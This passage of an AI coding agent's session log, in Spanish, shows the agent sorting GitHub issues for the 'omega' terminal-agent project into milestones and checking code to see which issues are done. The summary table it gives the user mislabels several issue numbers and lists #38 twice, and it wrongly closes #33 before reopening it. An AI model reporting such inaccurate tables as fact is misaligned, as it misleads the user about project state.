+          "content": "https://github.com/belizar/omega/issues/18\nhttps://github.com/belizar/omega/issues/16\nhttps://github.com/belizar/omega/issues/11\nhttps://github.com/belizar/omega/issues/9\nhttps://github.com/belizar/omega/issues/13\nhttps://github.com/belizar/omega/issues/12\nhttps://github.com/belizar/omega/issues/10\nhttps://github.com/belizar/omega/issues/6\nhttps://github.com/belizar/omega/issues/7\nhttps://github.com/belizar/omega/issues/8\nLegacy issues done\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Verifico el estado final:"
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_Gr6aIR4R8z4MiBCeC3fh6733",
+          "name": "bash",
+          "input": {
+            "command": "echo \"=== Milestones ===\" && gh api repos/belizar/omega/milestones --jq '.[] | \"\\(.title): \\(.open_issues) issues\"' && echo \"\" && echo \"=== Issues sin milestone ===\" && gh issue list --limit 50 --json number,title,milestone --jq '.[] | select(.milestone == null) | \"\\(.number) \\(.title)\"'"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_Gr6aIR4R8z4MiBCeC3fh6733",
+          "content": "=== Milestones ===\nCore & Runner: 9 issues\nTools: 6 issues\nTUI: 5 issues\nTests: 6 issues\nDocs & DX: 3 issues\nBenchmarking: 2 issues\n\n=== Issues sin milestone ===\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Todo listo. Acá el resumen:\n\n---\n\n## Issues creadas (18 nuevas + 13 existentes = 31 total)\n\n### Core & Runner (9)\n| # | Título |\n|---|---|\n| 24 | BUG: Runner no frena con stop_reason === \"tool_use\" |\n| 25 | BUG: Non-null assertion en config.openrouterApiKey sin validación |\n| 26 | BUG: Truncate afecta al modelo, no solo al display |\n| 31 | CHORE: Tipar 'any' en runner y providers |\n| 35 | ENH: Streaming (SSE) en llamadas al LLM |\n| 18 | FEAT: Selección de provider por config |\n| 16 | BUG: AnthropicProvider manda mensajes sin traducir |\n| 11 | LIKE: SIGINT para interrumpir al agente |\n| 9 | LIKE: Ejecución paralela de tools independientes |\n\n### Tools (6)\n| # | Título |\n|---|---|\n| 36 | ENH: Compaction/poda dentro del loop + descartar archivos |\n| 37 | ENH: Tool apply-patch / multi-edit + mejor feedback de error |\n| 32 | ENH: Usar DisplayToolCall |\n| 12 | LIKE: Sandbox para bash execution |\n| 10 | LIKE: Modo plan / confirmación |\n| 6 | LIKE: Modo diff (+/-) para edits |\n\n### TUI (5)\n| # | Título |\n|---|---|\n| 38 | ENH: Renderizado de Markdown en la TUI |\n| 39 | ENH: Autocompletado de paths en el editor |\n| 33 | ENH: Rotación de logs |\n| 7 | LIKE: Autocompletado de paths |\n| 8 | LIKE: Edición de mensajes previos |\n\n### Tests (6)\n| # | Título |\n|---|---|\n| 21 | TESTS: Componentes TUI sin cobertura |\n| 14 | TESTS: Cobertura de tests para componentes críticos |\n| 27 | TESTS: Tests de EditTool |\n| 28 | TESTS: Tests de commands |\n| 29 | TESTS: Tests de context-management |\n| 30 | TESTS: Tests de Session |\n\n### Docs & DX (3)\n| # | Título |\n|---|---|\n| 38 | ENH: Verificación de comportamiento en system prompt |\n| 20 | DOCS: README desactualizado |\n| 13 | LIKE: Sistema de memoria/cabinet |\n\n### Benchmarking (2)\n| # | Título |\n|---|---|\n| 40 | ENH: Modo headless para benchmarking |\n| 41 | ENH: Harness de corrida para benchmarks |\n\n---\n\nTodo quedó agrupado en **6 Milestones**. Para verlo visualmente podés ir a https://github.com/belizar/omega/milestones.\n\nPara el Project tipo Kanban, necesitás refrescar el token con `gh auth refresh -s project`. Si lo hacés, lo creo en dos minutos."
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": "pero lo hiciste  vos hace un rato o no"
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "No, el Project no se creó. El comando `gh project create` falló con:\n\n```\nerror: your authentication token is missing required scopes [project read:project]\n```\n\nEn ese momento te pedí que ejecutaras `gh auth refresh -s project,read:project` para darle permisos al token, pero no hubo respuesta. Como alternativa creé los **Milestones**, que sí funcionan sin ese scope extra y logran lo mismo: agrupar issues."
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": "Bueno dejalo asi"
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Bien. Quedó todo ordenado con 31 issues en 6 Milestones. Podés verlo en https://github.com/belizar/omega/milestones. Cuando quieras arrancar con alguna, decime y la codeamos."
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": "El renderizado de markdown ya esta "
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_1v8shhOE0V5NfMj3CCQI7153",
+          "name": "bash",
+          "input": {
+            "command": "ls src/tui/markdown/ 2>/dev/null || echo \"No existe src/tui/markdown/\""
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_JP2C1XnigjiJCMwuyW1i5658",
+          "name": "grep",
+          "input": {
+            "pattern": "MarkdownRenderer|AnsiRenderer|markdown",
+            "include": "*.ts",
+            "path": "src"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_1v8shhOE0V5NfMj3CCQI7153",
+          "content": "ansi-renderer.ts\nplain-renderer.ts\ntypes.ts\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_JP2C1XnigjiJCMwuyW1i5658",
+          "content": "\n-- grep \"MarkdownRenderer|AnsiRenderer|markdown\" en src --\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/ansi-renderer.ts:1:import { MarkdownRenderer, ColumnAlign } from \"./types.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/ansi-renderer.ts-2-import { bold, cyan, dim, gray, green } from \"../theme.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/ansi-renderer.ts-3-import { stdout } from \"process\";\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/ansi-renderer.ts-6-\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/ansi-renderer.ts-7-/**\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/ansi-renderer.ts:8: * Traduce markdown a secuencias ANSI para renderizado en terminal.\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/ansi-renderer.ts-9- */\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/ansi-renderer.ts:10:class AnsiRenderer implements MarkdownRenderer {\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/ansi-renderer.ts-11-  text(text: string): string {\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/ansi-renderer.ts-12-    return text;\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/ansi-renderer.ts-122-}\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/ansi-renderer.ts-123-\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/ansi-renderer.ts:124:export { AnsiRenderer };\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts:1:/** Alineación de columna en una tabla markdown. */\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts-2-type ColumnAlign = \"left\" | \"center\" | \"right\";\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts-3-\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts:4:/** Renderer abstracto de elementos markdown. Cada implementación traduce\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts-5- * los elementos a un formato concreto (ANSI, HTML, texto plano, etc.). */\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts:6:interface MarkdownRenderer {\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts-7-  /** Texto sin markup */\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts-8-  text(text: string): string;\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts-29-  blockquote(text: string): string;\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts-30-\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts:31:  /** Tabla markdown. headers y rows son arrays de celdas (ya sin pipes). */\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts-32-  table(headers: string[], rows: string[][], alignments: ColumnAlign[]): string;\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts-33-\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts-57-}\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts-58-\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/types.ts:59:export type { MarkdownRenderer, ColumnAlign };\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/plain-renderer.ts:1:import { MarkdownRenderer, ColumnAlign } from \"./types.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/plain-renderer.ts-2-\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/plain-renderer.ts-3-/**\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/plain-renderer.ts-5- * Útil para tests y para ver la salida \"cruda\" del parser.\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/plain-renderer.ts-6- */\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/plain-renderer.ts:7:class PlainRenderer implements MarkdownRenderer {\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/plain-renderer.ts-8-  text(text: string): string {\n/Users/benjaminlizarraga/Workspace/omega/src/tui/markdown/plain-renderer.ts-9-    return text;\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-1-import { cyan, dim, gray } from \"../theme.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts:2:import { MarkdownRenderer, ColumnAlign } from \"../markdown/types.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts:3:import { PlainRenderer } from \"../markdown/plain-renderer.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-4-import { Screen } from \"../screen.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-5-\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-8-}\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-9-\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts:10:/** Estado del parser de markdown (línea por línea). */\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-11-type ParserState = {\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-12-  inCodeBlock: boolean;\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-43-class DisplayAssistantText implements DisplayText {\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-44-  #screen: Screen;\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts:45:  #renderer: MarkdownRenderer;\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-46-  #buffer = \"\";\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-47-  #streaming = false;\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-48-  #parserState: ParserState;\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-49-\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts:50:  constructor(screen: Screen, renderer?: MarkdownRenderer) {\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-51-    this.#screen = screen;\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-52-    this.#renderer = renderer ?? new PlainRenderer();\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-56-  /** Muestra un chunk de texto (modo streaming). Acumula en buffer,\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-57-   * flushea líneas completas al scrollback y mantiene la línea en\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts:58:   * progreso como texto efímero. Cada línea se parsea como markdown antes\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-59-   * de ser renderizada. */\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-60-  displayStream(chunk: string): void {\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-66-    const partial = lines[lines.length - 1];\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-67-\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts:68:    // Flushear líneas completas al scrollback (parseadas como markdown)\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-69-    if (complete.length > 0) {\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/display-text.ts-70-      this.#screen.clearEphemeral();\n--\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-25-  DisplayToolResult,\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-26-} from \"./tui/components/display-text.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts:27:import { AnsiRenderer } from \"./tui/markdown/ansi-renderer.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-28-import { LineEditor } from \"./tui/components/line-editor.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-29-import { Prompt } from \"./tui/components/prompt.js\";\n--\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-109-  const screen = new Screen(config.screenPadding);\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-110-  const spinner = new Spinner(screen);\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts:111:  const assistantText = new DisplayAssistantText(screen, new AnsiRenderer());\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-112-  const toolCallText = new DisplayToolCall(screen);\n/Users/benjaminlizarraga/Workspace/omega/src/index.ts-113-  const toolResultText = new DisplayToolResult(screen);",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_iy2nmI9lgoegBhXvE7yB6602",
+          "name": "bash",
+          "input": {
+            "command": "gh issue close 38 --comment \"Ya implementado: tipos, AnsiRenderer, PlainRenderer, DisplayAssistantText con parser de markdown, e integración en index.ts.\" 2>&1"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_Gpgf6BQFxBGtdSKnzWVj0745",
+          "name": "bash",
+          "input": {
+            "command": "gh issue close 32 --comment \"Ya implementado: DisplayToolCall se usa en index.ts (línea 112).\" 2>&1"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_02_oqZJwFQGe3L1w9GsaJnH8494",
+          "name": "bash",
+          "input": {
+            "command": "gh issue close 33 --comment \"Los logs ya están en .omega/logs/. Si se necesita rotación, se trackea en #34.\" 2>&1"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_iy2nmI9lgoegBhXvE7yB6602",
+          "content": "✓ Closed issue belizar/omega#38 (ENH: Renderizado de Markdown en la TUI)\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_Gpgf6BQFxBGtdSKnzWVj0745",
+          "content": "✓ Closed issue belizar/omega#32 (ENH: Usar DisplayToolCall para mostrar tool calls)\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_02_oqZJwFQGe3L1w9GsaJnH8494",
+          "content": "✓ Closed issue belizar/omega#33 (ENH: Streaming (SSE) en llamadas al LLM)\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Uy, cerré de más. #33 (Streaming SSE) no está implementado, lo reabro."
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_tjwu6pAhdojTNiSj1wjg2067",
+          "name": "bash",
+          "input": {
+            "command": "gh issue reopen 33 2>&1"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_tjwu6pAhdojTNiSj1wjg2067",
+          "content": "✓ Reopened issue belizar/omega#33 (ENH: Streaming (SSE) en llamadas al LLM)\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Bien, recap de lo que hice:\n\n- **#38 (Renderizado de Markdown)**: Cerrada. El código existe completo: `src/tui/markdown/` con tipos, AnsiRenderer, PlainRenderer, parser integrado en DisplayAssistantText y `index.ts` usa `AnsiRenderer`.\n- **#33 (Streaming SSE)**: La cerré por error y la reabrí. No está implementada.\n- **#32 (DisplayToolCall)**: Cerrada. `index.ts` línea 112 ya lo instancia: `new DisplayToolCall(screen)`.\n\n¿Reviso qué otras issues del milestone \"TUI\" o \"Docs & DX\" podrían estar ya resueltas?"
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": "Dale revisa todo y decidimos en que trabajamos"
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_QzyH4C0qF2JSBqIII58Y0368",
+          "name": "bash",
+          "input": {
+            "command": "gh issue list --limit 50 --json number,title,state,milestone --jq '.[] | \"\\(.number)|\\(.state)|\\(.milestone.title // \"sin\")|\\(.title)\"'"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_QzyH4C0qF2JSBqIII58Y0368",
+          "content": "41|OPEN|Benchmarking|ENH: Harness de corrida para benchmarks\n40|OPEN|Benchmarking|ENH: Modo headless para benchmarking de modelos\n39|OPEN|TUI|ENH: Autocompletado de paths en el editor\n37|OPEN|Tools|ENH: Verificación de comportamiento en system prompt\n36|OPEN|Tools|ENH: Tool apply-patch / multi-edit + mejor feedback de error en edit\n35|OPEN|Core & Runner|ENH: Compaction/poda dentro del loop + descartar archivos ya usados\n34|OPEN|Docs & DX|ENH: Rotación de logs\n33|OPEN|TUI|ENH: Streaming (SSE) en llamadas al LLM\n31|OPEN|Core & Runner|CHORE: Tipar 'any' en runner y providers\n30|OPEN|Tests|TESTS: Tests de Session — persistencia, reanudación, clear, info\n29|OPEN|Tests|TESTS: Tests de context-management (truncate, pruneContext)\n28|OPEN|Tests|TESTS: Tests de commands (/clear, dispatchCommand)\n27|OPEN|Tests|TESTS: Tests de EditTool\n26|OPEN|Core & Runner|BUG: Truncate afecta al modelo, no solo al display\n25|OPEN|Core & Runner|BUG: Non-null assertion en config.openrouterApiKey sin validación\n24|OPEN|Core & Runner|BUG: Runner no frena con stop_reason === \"tool_use\"\n21|OPEN|Tests|TESTS: Componentes TUI sin cobertura\n20|OPEN|Docs & DX|DOCS: README desactualizado\n18|OPEN|Core & Runner|FEAT: Selección de provider por config\n16|OPEN|Core & Runner|BUG: AnthropicProvider manda mensajes sin traducir\n14|OPEN|Tests|TESTS: Cobertura de tests para componentes críticos\n13|OPEN|Docs & DX|LIKE: Sistema de memoria/cabinet (largo plazo)\n12|OPEN|Tools|LIKE: Sandbox para bash ejecution\n11|OPEN|Core & Runner|LIKE: SIGINT para interrumpir al agente sin matar el proceso\n10|OPEN|Tools|LIKE: Modo plan / confirmación para tareas grandes\n9|OPEN|Core & Runner|LIKE: Ejecución paralela de tools independientes\n7|OPEN|TUI|LIKE: Autocompletado de paths en el editor\n8|OPEN|TUI|LIKE: Edición de mensajes previos\n6|OPEN|Tools|LIKE: Modo diff (+/-) para edits\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Voy a verificar en el código cuáles están realmente implementadas."
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_LludcFMEKt3n2fO3ugVC7503",
+          "name": "bash",
+          "input": {
+            "command": "gh issue view 11 --json title,body --jq '.title + \"\\n\" + .body' 2>&1 | head -20"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_B20eIgl3E9qCFHc5dhNT6594",
+          "name": "grep",
+          "input": {
+            "include": "*.ts",
+            "pattern": "SIGINT|Interrumpido|interruptHandler|Ctrl\\+C",
+            "path": "src"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_02_hsaXe2cUnwmdQ1JPR58T2585",
+          "name": "grep",
+          "input": {
+            "include": "*.ts",
+            "pattern": "ask_user|askUser|AskUserTool",
+            "path": "src"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_03_OD8nGaOj3e0EtYvMXKq83875",
+          "name": "grep",
+          "input": {
+            "include": "*.ts",
+            "pattern": "stop_reason|end_turn",
+            "path": "src"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_LludcFMEKt3n2fO3ugVC7503",
+          "content": "LIKE: SIGINT para interrumpir al agente sin matar el proceso\nHoy Ctrl+C mata el proceso entero. Lo ideal sería que:\n- Durante una llamada al LLM: interrumpa la generación actual pero mantenga la sesión viva\n- Durante la ejecución de una tool: interrumpa la tool y devuelva error al modelo\n- El historial y la sesión se preservan, volvés al prompt\n\n**Tareas:**\n- Manejar SIGINT en el loop del Runner\n- Abortar el fetch en progreso (AbortController)\n- Matar el proceso hijo de bash si hay uno corriendo\n- Restaurar el prompt limpio\n\n**Prioridad:** LIKE TO HAVE.\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_B20eIgl3E9qCFHc5dhNT6594",
+          "content": "\n-- grep \"SIGINT|Interrumpido|interruptHandler|Ctrl\\+C\" en src --\n/Users/benjaminlizarraga/Workspace/omega/src/tui/terminal.ts-15-  process.on(\"exit\", disableRawMode);\n/Users/benjaminlizarraga/Workspace/omega/src/tui/terminal.ts-16-\n/Users/benjaminlizarraga/Workspace/omega/src/tui/terminal.ts:17:  // Restaurar ante SIGTERM. SIGINT se maneja en el Screen/runner para\n/Users/benjaminlizarraga/Workspace/omega/src/tui/terminal.ts-18-  // interrumpir al agente sin matar el proceso.\n/Users/benjaminlizarraga/Workspace/omega/src/tui/terminal.ts-19-  process.on(\"SIGTERM\", () => {\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-49-  #paddingRight: number;\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-50-\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts:51:  /** Si está seteado, Ctrl+C durante la ejecución del agente aborta esta\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-52-   * señal en lugar de matar el proceso. */\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-53-  #abortSignal: AbortController | null = null;\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-58-  }\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-59-\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts:60:  /** Registra un AbortController para que Ctrl+C lo aborte durante la\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-61-   * ejecución del agente, en lugar de matar el proceso. */\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-62-  setAbortController(ctrl: AbortController): void {\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-221-\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-222-  #onData = (raw: string): void => {\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts:223:    // Durante la ejecución del agente, solo dejamos pasar Ctrl+C y Esc\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-224-    // para interrupción; el resto del input se ignora.\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-225-    if (!this.#reading) {\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts:226:      // Ctrl+C: \\x03. Esc: \\x1b. Escape sequences (flechas, etc): \\x1b[...]\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-227-      // Solo pasamos \\x03 y \\x1b solo (sin argumentos extra).\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-228-      if (raw === \"\\x03\" || raw === \"\\x1b\") {\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-279-        return;\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-280-      }\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts:281:      // Solo Ctrl+C (no Esc) mata el proceso en el prompt normal\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-282-      if (key.type === \"ctrl\" && key.key === \"c\") {\n/Users/benjaminlizarraga/Workspace/omega/src/tui/screen.ts-283-        stdout.write(CURSOR_SHOW);\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-274-      const timeoutId = setTimeout(() => controller.abort(), TIMEOUT_MS);\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-275-\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts:276:      // Si el usuario interrumpe (SIGINT), abortar el fetch\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-277-      const onAbort = () => controller.abort();\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-278-      userSignal?.addEventListener(\"abort\", onAbort, { once: true });\n--\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/tui/decodeKey.test.ts-99-    });\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/tui/decodeKey.test.ts-100-\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/tui/decodeKey.test.ts:101:    it(\"should decode Ctrl+C\", () => {\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/tui/decodeKey.test.ts-102-      expect(decodeKey(\"\\x03\")).toEqual({ type: \"ctrl\", key: \"c\" });\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/tui/decodeKey.test.ts-103-    });\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-86-  }\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-87-\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:88:  /** Expone si el runner fue interrumpido (SIGINT) — el caller lo usa para\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-89-   * saber si debe guardar métricas parciales o descartarlas. */\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-90-  get interrupted(): boolean {\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-301-        this.#interrupted = true;\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-302-        logger.info(\"Runner interrupted by abort signal\");\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:303:        yield { type: \"text\", text: \"⏹ Interrumpido por el usuario.\" };\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-304-        break;\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-305-      }\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-318-          this.#interrupted = true;\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-319-          logger.info(\"LLM call aborted by signal\");\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:320:          yield { type: \"text\", text: \"⏹ Interrumpido por el usuario.\" };\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-321-          const partialMessage: Message = {\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-322-            role: \"assistant\",",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_02_hsaXe2cUnwmdQ1JPR58T2585",
+          "content": "\n-- grep \"ask_user|askUser|AskUserTool\" en src --\n/Users/benjaminlizarraga/Workspace/omega/src/tools/ask-user.ts-12- * un error descriptivo.\n/Users/benjaminlizarraga/Workspace/omega/src/tools/ask-user.ts-13- */\n/Users/benjaminlizarraga/Workspace/omega/src/tools/ask-user.ts:14:export class AskUserTool extends Tool<AskUserInput, string> {\n/Users/benjaminlizarraga/Workspace/omega/src/tools/ask-user.ts-15-  constructor() {\n/Users/benjaminlizarraga/Workspace/omega/src/tools/ask-user.ts-16-    super({\n/Users/benjaminlizarraga/Workspace/omega/src/tools/ask-user.ts:17:      name: \"ask_user\",\n/Users/benjaminlizarraga/Workspace/omega/src/tools/ask-user.ts-18-      description:\n/Users/benjaminlizarraga/Workspace/omega/src/tools/ask-user.ts-19-        \"Pide confirmación o input al usuario. Usala cuando necesites aprobación \" +\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tools/ask-user.ts-37-\n/Users/benjaminlizarraga/Workspace/omega/src/tools/ask-user.ts-38-  execute(_input: AskUserInput): string {\n/Users/benjaminlizarraga/Workspace/omega/src/tools/ask-user.ts:39:    return \"Error: ask_user debe ser interceptado por el runner. Esto es un bug interno.\";\n/Users/benjaminlizarraga/Workspace/omega/src/tools/ask-user.ts-40-  }\n/Users/benjaminlizarraga/Workspace/omega/src/tools/ask-user.ts-41-}\n--\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/ask-user-input.ts-3-\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/ask-user-input.ts-4-/**\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/ask-user-input.ts:5: * Input minimal de una línea para responder preguntas del agente (ask_user).\n/Users/benjaminlizarraga/Workspace/omega/src/tui/components/ask-user-input.ts-6- * Solo acepta Enter para confirmar y 